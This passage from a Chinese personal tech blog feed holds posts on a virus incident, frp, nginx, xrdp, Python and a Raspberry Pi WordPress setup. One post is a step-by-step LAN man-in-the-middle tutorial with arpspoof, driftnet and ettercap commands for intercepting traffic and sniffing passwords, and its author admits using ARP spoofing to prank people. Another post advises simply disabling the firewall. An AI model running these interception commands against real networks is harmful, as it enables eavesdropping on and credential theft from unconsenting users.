id="more"></a><p>然而事情没有那么简单，过了不久又弹出了一样的广告出来，我心里有点不乐意了，心里暗暗骂道，太流氓了。我看到广告界面右上角有个倒三角符号，我就点击一下，弹出选择：一天内不弹出、一周内不弹出，永久不弹出。<br>我选择了永久不弹出，然后随手关闭了，之前遇到过一种广告，选择永久不弹出的话需要注册用户才行，现在这个广告不用注册就可以关闭了，对比一下还是挺良心的嘛，既然能够永久不弹出的话我就不去深究了，我本人是最痛恨流氓软件的，所以我的个人电脑上是看不到广告这个玩意的，我电脑上的软件都是精心挑选的。上班时我都是使用自己的个人电脑。</p><p>可事情还是没有那么的简单，过了不久广告又弹出来了，这下可激怒我了，虽然是工作上的电脑，但我也不能容忍流氓软件这么猖狂，我明明选择了永久不弹出，它还在不停的弹出，这就是挑衅，这就是真正意义上的耍流氓的软件，必须干掉它。</p><p>接下来好戏便开始了，我看了一下广告界面，看不出是哪个软件产生的广告，我关闭广告后，进入电脑桌面，发现桌面壁纸被删除了，只留下黑乎乎的电脑桌面背景和桌面上的图标，我心想这不正常，这电脑平时没什么人会用，不应该会有人设置这样的桌面背景。此时这个广告还在不停的弹出。我想看看最近是不是安装了什么新的流氓软件，我点击开始按钮，结果按了之后没有反应，这就更奇怪了，打开任务管理器，我一看，内存使用率达到99%，我仔细看看，没有看到占用内存高的进程，此时我就知道是中病毒了，病毒把进程隐藏了，有意思，这时候就需要安全软件登场了，电脑桌面按什么都没有反应，然后我看下任务栏有不显示程序的三角符号，如果这台电脑上有安全软件的话一定会自动开机运行的，我看了一下有个火绒的安全软件，这下可以扫描一下病毒了，结果点击了火绒之后没反应，反而火绒退出了，就这样消失在我的眼前，我心想，这火绒也太弱了吧，居然被病毒干掉了。</p><p>这时候只能重启系统了，按住ctrl+alt+del键，选择电源那里，选择重启，结果有个未知的程序跳出来阻止关机，没关系，这里选择仍然关机。系统开机之后，系统能正常运行了，虽然病毒会开机自动运行，但没那么快。我打开开始按钮搜索火绒，结果没有找到，原来火绒已经被这个病毒删掉了，这个病毒还是有两把刷子的。我就打开浏览器重新下载个火绒安装，我之所以还要下载火绒，是想看看火绒能不能解决这个病毒，毕竟我的个人电脑上也安装了火绒。在这里我要说一下，国内的安全软件我只用火绒，因为火绒真的干净，没有广告，体积小，我本来电脑是没有安装安全软件的，就用微软自带的安全软件。后面看到火绒这个软件，感觉挺良心的，就支持一下它，就安装了。不过我电脑到目前为止都没有中过任何病毒。言归正传，安装了火绒之后就开始进行安全扫描了，果不其然，很快就扫描出了两个木马病毒，我一看原来是金山的程序搞的，处理病毒之后，我立刻将电脑上跟金山有关的软件全部卸载了，并且对电脑进行深度安全检查，后面又扫描出16个危险文件，包括后门病毒。处理之后，我又对电脑进行安装补丁。</p><p>这是我第一次遇到电脑中病毒的事件，挺有意思的，以前我刚玩电脑时，我几乎把全世界的有名安全软件都装了一遍，但我电脑从来都没有中过毒，我后面就很少再安装安全软件了，本来只用微软自带的安全软件也足够了，可是发现，平时要玩一些破解软件时，破解程序都被微软自带的干掉了，有点不方便，就用火绒来替代自带的了。</p><p>说真的，一个企业做这种事情，感觉有点恶心。不过能写出病毒的人都是挺牛逼的。不说那么多了，我还有大把东西需要学习。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决frp无法开机启动的问题</title>
      <link href="/2020/02/01/%E8%A7%A3%E5%86%B3frp%E6%97%A0%E6%B3%95%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2020/02/01/%E8%A7%A3%E5%86%B3frp%E6%97%A0%E6%B3%95%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>由于现在疫情的情况，新年假期延长了，我的是二月十号才去上班，这段时间都是呆在家里，不是打游戏就是打桌球，好是枯燥的生活，最近我趁着无聊的时间，就把家里的笔记本重装了centos8.1的系统，之前是centos7.7的系统，主要我就是图个新而已，其实差别都不大。</p><a id="more"></a><p>安装了centos系统之后，必定紧接着就是安装配置frp，这样我才能在外地远程进去。但是我配置完后发现frp并不能开机启动，我很仔细的检查过配置文件frpc.ini的内容，还有 vim /lib/systemd/system/frpc.service<br>里面的内容，都是没有问题的，执行systemctl start frpc 也是可以正常启动。但就是每次重启系统后不能启动frp，让我好是迷惑啊。</p><p>其实有经验的朋友可能很轻易就能想到是防火墙的问题了，我后面开始排除故障原因的时候，就想到了这是新装的系统，防火墙firewalld是正常启动的，于是我就把firewalld关闭了，后面就正常了。我之所以关闭防火墙，而不选择在防火墙上开启相应的端口，主要是嫌麻烦，因为这是家里的一台普通电脑而已，没有重要的资料需要保护，讲白，就是用不上防火墙。所以就关闭一了百了。<br>在家时间长了，学习的欲望低了，好是颓废了，这样下去真的难受，心里感觉好不充实，假期这么长，用来学习是一件很好的事，可不知为什么，总是提不起学习的欲望。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7编译安装nginx并设置开机启动</title>
      <link href="/2020/01/12/centos7%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85nginx%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
      <url>/2020/01/12/centos7%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85nginx%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Nginx的应用场景"><a href="#Nginx的应用场景" class="headerlink" title="Nginx的应用场景"></a>Nginx的应用场景</h2><p>(1).http服务器。Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。<br>(2).虚拟主机。可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。<br>(3).反向代理，负载均衡。当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况。</p><a id="more"></a><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-检查并安装所需的依赖软件"><a href="#1-检查并安装所需的依赖软件" class="headerlink" title="1.检查并安装所需的依赖软件"></a>1.检查并安装所需的依赖软件</h3><p>(1).gcc:nginx编译依赖gcc环境<br>安装命令：<code>yum install gcc-c++</code></p><p>(2).pcre:(Perl Compatible Regular Expressions)是一个Perl库，包括perl兼容的正则表达式库。nginx的http模块使用pcre来解析正则表达式.<br>安装命令：<code>yum install -y pcre pcre-devel</code></p><p>(3).zlib：该库提供了很多种压缩和解压缩的方式，nginx使用zlib对http包的内容进行gzip。<br>安装命令：<code>yum install -y zlib zlib-devel</code></p><p>(4).openssl:一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。nginx不仅支持http协议，还支持https（即在ssl协议上传输http）.<br>安装命令：<code>yum install -y openssl openssl-devel</code></p><h3 id="2-下载nginx源码包"><a href="#2-下载nginx源码包" class="headerlink" title="2.下载nginx源码包"></a>2.下载nginx源码包</h3><p>下载命令：<code>wget http://nginx.org/download/nginx-1.17.7.tar.gz</code></p><h3 id="3-解压缩源码包并进入"><a href="#3-解压缩源码包并进入" class="headerlink" title="3.解压缩源码包并进入"></a>3.解压缩源码包并进入</h3><p>(1).解压缩：<code>tar -zxvf nginx-1.17.7.tar.gz</code></p><p>(2).进入解压缩后文件夹：<code>cd nginx-1.17.7</code></p><h3 id="4-配置编译参数命令-可以使用-configure-–help查询详细参数"><a href="#4-配置编译参数命令-可以使用-configure-–help查询详细参数" class="headerlink" title="4.配置编译参数命令:(可以使用./configure –help查询详细参数)"></a>4.配置编译参数命令:(可以使用./configure –help查询详细参数)</h3><pre><code class="jboss-cli">./configure</code></pre><p>注：安装之前需要手动创建上面指定的nginx文件夹，即/var/temp、/var/temp/nginx、/var/run/nginx文件夹，否则启动时报错</p><h3 id="5-编译并安装"><a href="#5-编译并安装" class="headerlink" title="5.编译并安装"></a>5.编译并安装</h3><p>命令：<code>make &amp;&amp; make install</code><br>可以进入/usr/local/nginx查看文件是否存在conf、sbin、html文件夹，若存在则安装成功</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="1-启动nginx"><a href="#1-启动nginx" class="headerlink" title="1.启动nginx"></a>1.启动nginx</h3><p>(1).进入安装目录</p><pre><code class="bash">cd /usr/local/nginx/sbin/</code></pre><p>(2).启动</p><pre><code class="jboss-cli">./nginx</code></pre><p>(3).若报错：[emerg] open() “/var/run/nginx/nginx.pid” failed (2: No such file or directory)<br>需要查看下是不是在/var/run文件夹下不存在nginx文件夹，不存在则新建</p><p>(4).查看是否启动：<code>ps -ef  | grep nginx</code><br>如果有master和worker两个进程证明启动成功<br>注意：执行./nginx启动nginx，这里可以-c指定加载的nginx配置文件，如下：</p><pre><code class="stata">./nginx -c /usr/local/nginx/conf/nginx.conf</code></pre><p>如果不指定-c，nginx在启动时默认加载conf/nginx.conf文件，此文件的地址也可以在编译安装nginx时指定./configure的参数(–conf-path= 指向配置文件（nginx.conf）)</p><h3 id="2-停止nginx"><a href="#2-停止nginx" class="headerlink" title="2.停止nginx"></a>2.停止nginx</h3><p>(1).暴力kill(不推荐使用)</p><pre><code class="bash">kill -9 processId</code></pre><p>(2).快速停止</p><pre><code class="bash">cd /usr/local/nginx/sbin &amp;&amp; ./nginx -s stop</code></pre><p>此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程</p><p>(3).完整停止(建议使用)</p><pre><code class="jboss-cli">cd /usr/local/nginx/sbin &amp;&amp; ./nginx -s quit</code></pre><p>此方式停止步骤是待nginx进程处理任务完毕进行停止。</p><h3 id="3-重启及重新加载配置"><a href="#3-重启及重新加载配置" class="headerlink" title="3.重启及重新加载配置"></a>3.重启及重新加载配置</h3><p>(1).先停止再启动（建议使用）</p><pre><code class="jboss-cli">./nginx -s quit &amp;&amp; ./nginx</code></pre><p>(2).重新加载配置文件</p><pre><code class="jboss-cli">./nginx -s reload</code></pre><h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h3><p>nginx安装成功，启动nginx,即可通过ip地址来访问nginx。（localhost或者127.0.0.1或者主机ip）</p><h2 id="Nginx设置开机启动"><a href="#Nginx设置开机启动" class="headerlink" title="Nginx设置开机启动"></a>Nginx设置开机启动</h2><h3 id="1-创建nginx-service文件"><a href="#1-创建nginx-service文件" class="headerlink" title="1.创建nginx.service文件"></a>1.创建nginx.service文件</h3><pre><code class="crystal">vim /usr/lib/systemd/system/nginx.service</code></pre><p>填入以下内容：</p><pre><code class="ini">[Unit]Description=nginx - high performance web serverAfter=nginx.service[Service]Type=forkingExecStart=/usr/local/nginx/sbin/nginx      # nginx的路径ExecReload=/usr/local/nginx/sbin/nginx -s reloadExecStop=/usr/local/nginx/sbin/nginx -s stopExecenable=/usr/local/nginx/sbin/nginx[Install]WantedBy=multi-user.target</code></pre><p>重启一下systemctl</p><pre><code class="ebnf">systemctl daemon-reload</code></pre><h3 id="2、修改脚本权限"><a href="#2、修改脚本权限" class="headerlink" title="2、修改脚本权限"></a>2、修改脚本权限</h3><pre><code class="crystal">chmod 754 /usr/lib/systemd/system/nginx.service   </code></pre><h3 id="3、设置为开启及开机自启动"><a href="#3、设置为开启及开机自启动" class="headerlink" title="3、设置为开启及开机自启动"></a>3、设置为开启及开机自启动</h3><pre><code class="stylus">systemctl start nginx.servicesystemctl status nginx.servicesystemctl enable nginx.service</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中间人攻击</title>
      <link href="/2019/12/31/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2019/12/31/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。</p><a id="more"></a><p>中间人攻击（Man-in-the-Middle Attack, MITM）是一种由来已久的网络入侵手段，并且当今仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。<br>随着计算机通信网技术的不断发展，MITM攻击也越来越多样化。最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等。后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行。如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的。</p><h2 id="工具与条件"><a href="#工具与条件" class="headerlink" title="工具与条件"></a>工具与条件</h2><p>1.kali系统（本次实验系统）<br>2.局域网内<br>3.本次实验只是普通的中间人攻击，纯属娱乐一下</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="第一步：扫描网段内存活的主机"><a href="#第一步：扫描网段内存活的主机" class="headerlink" title="第一步：扫描网段内存活的主机"></a>第一步：扫描网段内存活的主机</h3><pre><code>fping -g -r 0 -s 192.168.1.0/24 | grep alive</code></pre><p><img src="https://img-blog.csdnimg.cn/20200101141955682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第二步：查看ip-forward的状态"><a href="#第二步：查看ip-forward的状态" class="headerlink" title="第二步：查看ip_forward的状态"></a>第二步：查看ip_forward的状态</h3><pre><code>cat /proc/sys/net/ipv4/ip_forward</code></pre><p>默认是0<br>如果不是0，则修改成0，0代表不转发流量，1代表转发流量。</p><pre><code>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h3 id="第三步：使用arpspoof进行双向欺骗"><a href="#第三步：使用arpspoof进行双向欺骗" class="headerlink" title="第三步：使用arpspoof进行双向欺骗"></a>第三步：使用arpspoof进行双向欺骗</h3><p>安装arpspoof：</p><pre><code>sudo apt-get install dsniff ssldump</code></pre><p>进行双向欺骗：<br>开两个终端，一个终端执行下面的一条指令。<br>arpspoof -i eth0 -t 192.168.1.127 192.168.1.1<br>arpspoof -i eth0 -t 192.168.1.1 192.168.1.127</p><p>此时，192.168.1.127这台设备应该是不能正常上网了。</p><p>我就是喜欢用这招来耍人，让他们上网上网就断网了，还找不到什么原因。</p><h3 id="第四步：进行端口转发"><a href="#第四步：进行端口转发" class="headerlink" title="第四步：进行端口转发"></a>第四步：进行端口转发</h3><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h3 id="第五步：进行图片嗅探"><a href="#第五步：进行图片嗅探" class="headerlink" title="第五步：进行图片嗅探"></a>第五步：进行图片嗅探</h3><pre><code>driftnet -i eth0</code></pre><h3 id="第六步：嗅探登录密码http协议"><a href="#第六步：嗅探登录密码http协议" class="headerlink" title="第六步：嗅探登录密码http协议"></a>第六步：嗅探登录密码http协议</h3><pre><code>ettercap -Tq -i eth0</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows桌面远程Ubuntu系统</title>
      <link href="/2019/12/27/Windows%E6%A1%8C%E9%9D%A2%E8%BF%9C%E7%A8%8BUbuntu%E7%B3%BB%E7%BB%9F/"/>
      <url>/2019/12/27/Windows%E6%A1%8C%E9%9D%A2%E8%BF%9C%E7%A8%8BUbuntu%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>来自：互联网上的小蜘蛛</p><p>我们平时远程Linux系统都是用xshell、SecureCRT等工具来远程，远程进去的都是终端界面，现在要玩的是用Windows系统自带的“远程桌面连接”软件来远程Linux系统，以Ubuntu为例。</p><a id="more"></a><h2 id="安装xrdp"><a href="#安装xrdp" class="headerlink" title="安装xrdp"></a>安装xrdp</h2><p>Windows的远程桌面使用的协议为RDP，接下来需要在Ubuntu的操作系统中安装xrdp。</p><p>打开Ubuntu的终端命令窗口。输入下面的指令进行安装。<br>安装xrdp需要安装tightvncserver组件，下面的命令将其相关的组件安装完成。</p><p><code>#sudo apt-get install tightvncserver xrdp</code></p><h2 id="连接Ubuntu"><a href="#连接Ubuntu" class="headerlink" title="连接Ubuntu"></a>连接Ubuntu</h2><p>完成安装后，进入Windows的操作系统，这里为Windows 10操作系统，打开Windows的远程桌面工具，输入Ubuntu系统的IP地址，就可以进行远程桌面的链接。<br>链接成功后，选择xorg，输入链接Ubuntu桌面的账号和密码，这里为root帐号链接</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决frp客户端不能同时多开问题</title>
      <link href="/2019/12/26/frp%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8D%E8%83%BD%E5%90%8C%E6%97%B6%E5%A4%9A%E5%BC%80/"/>
      <url>/2019/12/26/frp%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8D%E8%83%BD%E5%90%8C%E6%97%B6%E5%A4%9A%E5%BC%80/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前段时间我配置了frp内网穿透，最近我发现了一个问题，就是我配置了多台frp客户端，只有一台能正常连接，其他的客户端都连接不了，一开始我以为是我配置问题，反反复复的核对配置步骤，配置都是没有问题的。现在的情况是：例如说，服务端端口是7000，客户端端口是7001，6000，现在只能7000，7001端口开启 或者 7000，6000端口开启，却不能7000，7001，6000端口同时开启。这种情况带来了很大的不便，必须要找到解决方法才行。</p><a id="more"></a><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>像这种情况还是配置问题，frp这么受欢迎的一个工具，不至于存在只能单用户机使用这么低级的功能的。所以问题应该还是出在配置上，且这个配置问题还是超出了我的认知范围。现在能解决的方法只能是查一下资料了。</p><h2 id="解决故障"><a href="#解决故障" class="headerlink" title="解决故障"></a>解决故障</h2><p>像这种使用比较广的工具，在网上的资料都是很齐全的了，只要愿意去找找就能找到解决的方法的。<br>通过搜索我终于找到了我的配置问题所在，原来是名字冲突了，修改一下名字即可。</p><p>[ssh2]     # 如果已经有一台叫[ssh]了，那么这里就修改为[ssh2],这样就不会冲突了。<br>type = tcp<br>local_ip = 192.168.2.195<br>local_port = 22<br>remote_port = 6000</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux将python默认python2修改为python3</title>
      <link href="/2019/12/24/Linux%E5%B0%86python%E9%BB%98%E8%AE%A4python2%E4%BF%AE%E6%94%B9%E4%B8%BApython3/"/>
      <url>/2019/12/24/Linux%E5%B0%86python%E9%BB%98%E8%AE%A4python2%E4%BF%AE%E6%94%B9%E4%B8%BApython3/</url>
      
        <content type="html"><![CDATA[<h1 id="kali-Linux将python修改为默认python3"><a href="#kali-Linux将python修改为默认python3" class="headerlink" title="kali Linux将python修改为默认python3"></a>kali Linux将python修改为默认python3</h1><p>现在python2接近2020年的停止维护时间了，可以说python2已经被淘汰掉了，而不少Linux系统上还默认是python2，而我们使用时每次都要刻意输入python3，感觉有点繁琐，作为一个懒癌患者，自然是无法容忍的。</p><a id="more"></a><h2 id="查看默认python是什么版本："><a href="#查看默认python是什么版本：" class="headerlink" title="查看默认python是什么版本："></a>查看默认python是什么版本：</h2><p>输入：python -V </p><h2 id="查看python路劲："><a href="#查看python路劲：" class="headerlink" title="查看python路劲："></a>查看python路劲：</h2><p>which python<br>显示是在    /usr/bin/python</p><h2 id="查看所有的python文件"><a href="#查看所有的python文件" class="headerlink" title="查看所有的python文件"></a>查看所有的python文件</h2><p>ls -al /usr/bin/python*</p><h2 id="删除当前python文件"><a href="#删除当前python文件" class="headerlink" title="删除当前python文件"></a>删除当前python文件</h2><p>sudo rm -rf /usr/bin/python</p><h2 id="替换为python3"><a href="#替换为python3" class="headerlink" title="替换为python3"></a>替换为python3</h2><p>ln -s /usr/bin/python3 /usr/bin/python</p><h2 id="再次查看默认python是什么版本："><a href="#再次查看默认python是什么版本：" class="headerlink" title="再次查看默认python是什么版本："></a>再次查看默认python是什么版本：</h2><p>输入：python -V </p><p>到此已完成了。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派使用wordpress搭建博客网站</title>
      <link href="/2019/12/18/%E6%A0%91%E8%8E%93%E6%B4%BEwordpress%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/"/>
      <url>/2019/12/18/%E6%A0%91%E8%8E%93%E6%B4%BEwordpress%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>手上的树莓派压箱底很久了，拿出来清清灰尘，通电还是能正常跑起来，这个树莓派是几年前就买了，好像是2代来的，内存只有512MB，现在树莓派都出到4B了，好想再剁手买一个新的树莓派4B来压下箱底，但仔细想想，如果树莓派没有派上用场的地方，再买一个新的也只是拿来观赏玩玩就扔一边放灰了，所以现在还是想想怎么把手上的老树莓派利用起来先，最近看到一篇教程就是用树莓派搭建博客网站，就想着拿来试试。正是如此，才让树莓派有了重见天日的机会。</p><a id="more"></a><h4 id="事情准备"><a href="#事情准备" class="headerlink" title="事情准备"></a>事情准备</h4><p><strong>安装树莓派系统</strong><br>下载镜像的地方<br>官网：<a href="https://www.raspberrypi.org/downloads/" target="_blank" rel="noopener">https://www.raspberrypi.org/downloads/</a><br>树莓派实验室：<a href="http://shumeipai.nxez.com/download#os" target="_blank" rel="noopener">http://shumeipai.nxez.com/download#os</a><br>工具：Win32DiskImager<br>具体安装步骤就不详细写了，网上一搜一大把。<br>接下来准备显示器，网线，键盘，连接上去修改密码，配置网络，更新系统<br>有一点要重点讲的，那就是配置ssh，树莓派默认是没有安装ssh服务的</p><h4 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h4><p>安装ssh<br>sudo apt install openssh-server<br>查看ssh有没有运行<br>systemctl status ssh.service     查看状态<br>systemctl start ssh.service        启动ssh<br>sytemctl enable ssh.service      设置开机启动<br>sudo /etc/init.d/ssh start            设置开机启动的第二种方法</p><h4 id="配置静态ip地址"><a href="#配置静态ip地址" class="headerlink" title="配置静态ip地址"></a>配置静态ip地址</h4><p>因为要搭建博客网站，就难免要内网穿透，就要设置静态ip了。</p><pre><code>sudo vim /etc/dhcpcd.conf</code></pre><p>填入：</p><pre><code>interface eth0static ip_address=192.168.1.179/24static routers=192.168.1.1static domain_name_servers=114.114.114.114 8.8.8.8</code></pre><p>reboot 重启系统</p><h3 id="开始搭建网站了"><a href="#开始搭建网站了" class="headerlink" title="开始搭建网站了"></a>开始搭建网站了</h3><h4 id="1-更换镜像源"><a href="#1-更换镜像源" class="headerlink" title="1.更换镜像源"></a>1.更换镜像源</h4><p><code>sudo vim /etc/apt/sources.list</code> 或者   <code>sudo nano /etc/apt/sources.list</code></p><p>把里面的源都注释掉，添加下面的进去。</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi</code></pre><p>保存退出</p><pre><code>sudo apt-get update</code></pre><h4 id="2-安装Apache"><a href="#2-安装Apache" class="headerlink" title="2.安装Apache"></a>2.安装Apache</h4><p>Apache是世界使用排名第一的Web服务器软件（开放源码的网页服务器）。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一</p><pre><code>sudo apt-get install apache2</code></pre><h4 id="3-安装MySQL"><a href="#3-安装MySQL" class="headerlink" title="3.安装MySQL"></a>3.安装MySQL</h4><p>MySQL是最好的关系数据库管理系统应用软件，其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。</p><pre><code>sudo apt-get install mysql-server</code></pre><p><strong>到了这里就要注意了，我用这个指令安装的时候是报错的。如下图：</strong><br><img src="https://img-blog.csdnimg.cn/20191220073926523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>E：软件包“ mysql-server”没有安装候选</strong></p><p>解决方法参考这个网友的做法：<a href="https://blog.csdn.net/wangmy1988/article/details/100550810" target="_blank" rel="noopener">https://blog.csdn.net/wangmy1988/article/details/100550810</a></p><p>安装mariadb-server</p><pre><code>sudo apt-get install mariadb-server</code></pre><h4 id="4-安装phpMyAdmin"><a href="#4-安装phpMyAdmin" class="headerlink" title="4.安装phpMyAdmin"></a>4.安装phpMyAdmin</h4><p>phpMyAdmin 是一个以PHP为基础的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p><pre><code>sudo apt-get install phpmyadmin</code></pre><p><img src="https://img-blog.csdnimg.cn/2019122007503025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>默认选择apache2，回车</p><p><img src="https://img-blog.csdnimg.cn/20191220075905499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回车<br><img src="https://img-blog.csdnimg.cn/20191220080031735.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入密码，tab健，选择ok<br><img src="https://img-blog.csdnimg.cn/20191220080149719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再次输入确认密码，选择ok，就安装完成了。</p><h4 id="5-配置MySQL"><a href="#5-配置MySQL" class="headerlink" title="5.配置MySQL"></a>5.配置MySQL</h4><pre><code>vim /etc/apache2/apache2.conf&lt;Directory /var/www/&gt;        Options Indexes FollowSymLinks        AllowOverride None           # 将 None 改成 All        Require all granted&lt;/Directory&gt;</code></pre><p>sudo mysql -u root -p<br><strong>提示输入密码，这里直接回车就行，或者输入什么密码都可以进去。</strong></p><p>重置mysql的加密方式：</p><pre><code>MariaDB [(none)]&gt; update mysql.user set plugin = &#39;mysql_native_password&#39;;</code></pre><p>返回以下则代表成功了。</p><pre><code>Query OK, 2 rows affected (0.009 sec)Rows matched: 2  Changed: 2  Warnings: 0</code></pre><p>更改数据库用户名和密码：</p><pre><code>MariaDB [(none)]&gt; update mysql.user set password=PASSWORD(&quot;~~mysqlpassword~~ &quot;) where User=&#39;root&#39;;Query OK, 1 row affected (0.012 sec)Rows matched: 1  Changed: 1  Warnings: 0</code></pre><p>刷新权限信息：</p><pre><code>MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.003 sec)</code></pre><p>CTRL C退出</p><h4 id="6-配置phpmyadmin"><a href="#6-配置phpmyadmin" class="headerlink" title="6.配置phpmyadmin"></a>6.配置phpmyadmin</h4><p>把phpayadmin链接到/var/www/html目录下</p><pre><code>sudo ln -s /usr/share/phpmyadmin /var/www/html</code></pre><h4 id="7-创建数据库"><a href="#7-创建数据库" class="headerlink" title="7.创建数据库"></a>7.创建数据库</h4><p>在浏览器上输入<a href="http://192.168.1.179/phpmyadmin/" target="_blank" rel="noopener">http://192.168.1.179/phpmyadmin/</a><br>（账号密码就是刚才mysql设置的账号密码）<br><img src="https://img-blog.csdnimg.cn/20191220211112713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>填写数据库信息：<br>数据库名称为wordpress，数据库的数据编码为utf8_unicode_ci<br><img 